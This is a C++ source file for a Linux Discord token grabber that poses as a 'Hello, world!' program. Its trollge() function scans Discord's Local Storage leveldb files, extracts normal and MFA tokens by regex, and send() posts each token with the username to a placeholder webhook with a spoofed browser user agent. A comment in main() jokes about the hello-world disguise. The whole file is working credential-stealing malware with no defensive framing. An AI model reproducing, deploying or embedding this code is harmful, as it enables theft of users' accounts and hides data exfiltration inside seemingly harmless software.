#define WEBHOOK "WEBHOOK URL HERE"

#include <iostream>
#include <fstream>
#include <curl/curl.h>
#include <regex>
#include <filesystem>
#include <unistd.h>
#include <vector>

using namespace std;
namespace fs = std::filesystem;

void send(string tkn) {
    // setting json up
    char* usernameForJson = getenv("USER");
    char* tokenForJson = const_cast<char *>(tkn.c_str());
    char* json = (char* ) malloc(219 + strlen(usernameForJson) + strlen(tokenForJson));
    strcpy(json, "{\"content\": null,\"embeds\": [{\"description\":\"Username:");
    strcat(json, usernameForJson);
    strcat(json, "\\nToken:");
    strcat(json, tokenForJson);
    strcat(json, "\",\"color\":null,\"author\": {\"name\": \"Le new grab from target using Linux!\"},\"footer\":{\"text\":\"ok there isnt more info anymore sooooo\"}}]}");

    // setting cURL
    CURL *curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        // headers
        struct curl_slist *hookyheaders = NULL;
        hookyheaders = curl_slist_append(hookyheaders, "Accept: application/json");
        hookyheaders = curl_slist_append(hookyheaders, "Content-Type: application/json");
        hookyheaders = curl_slist_append(hookyheaders, "charset: utf-8");

        // set uppery
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK);
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hookyheaders);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (iPad; CPU OS 7_2_1 like Mac OS X; en-US) AppleWebKit/534.30.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B118 Safari/6534.30.4");

        // now try to send the request
        curl_easy_perform(curl);

        // cleanup
        curl_easy_cleanup(curl);
    }
    // cleanup
    curl_global_cleanup();
    free(json);
    return;
}

void trollge() {
    char* targethomedir = getenv("HOME");
    string thomedirstr = string(targethomedir);
    string dir[3] = {
        thomedirstr + "/.config/discord/Local Storage/leveldb",
        thomedirstr + "/.config/discordcanary/Local Storage/leveldb",
        thomedirstr + "/.config/discordptb/Local Storage/leveldb"
    };

    vector<string> existingdirs;
    for (auto &entry : dir) {
        if (fs::exists(entry)) {
            existingdirs.push_back(entry);
        }
    }
    if (existingdirs.empty())
        return;

    vector<string> files;
    for (auto item : existingdirs) {
        fs::path entry(item);
        for (auto &file : fs::directory_iterator(entry)) {
            string fileext = file.path().extension().string();
            if (
                fileext.compare(".log") == 0 ||
                fileext.compare(".LOG") == 0 ||
                fileext.compare(".ldb") == 0 ||
                fileext.compare(".LDB") == 0
            ) {
                files.push_back(file.path().string());
            }
        }
    }
    if (files.empty())
        return;

    vector<string> tokens;
    for (size_t i = 0; i < files.size(); i++) {
        string entry;
        for (auto &character : files[i])
            entry += character;

        ifstream file(entry, ios::binary);
        if (file.is_open()) {
            string line;
            while (getline(file, line)) {
                regex r("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}"); // both normal and 2fa tokens gets to be grabbed
                smatch m;
                regex_search(line, m, r);
                if (m.length() != 0) {
                    for (auto x : m) {
                        tokens.push_back(x);
                    }
                }
            }
        }
        file.close();
    }
    if (tokens.empty())
        return;

    for (auto &item : tokens) {
        send(string(item));
    }

    return;
}

int main() {
    cout << "Hello, world!" << endl;
    trollge(); // totally not a token grabber and a normal hello world, that for some reason takes around one second to exit after printing the text
    return 0;
}
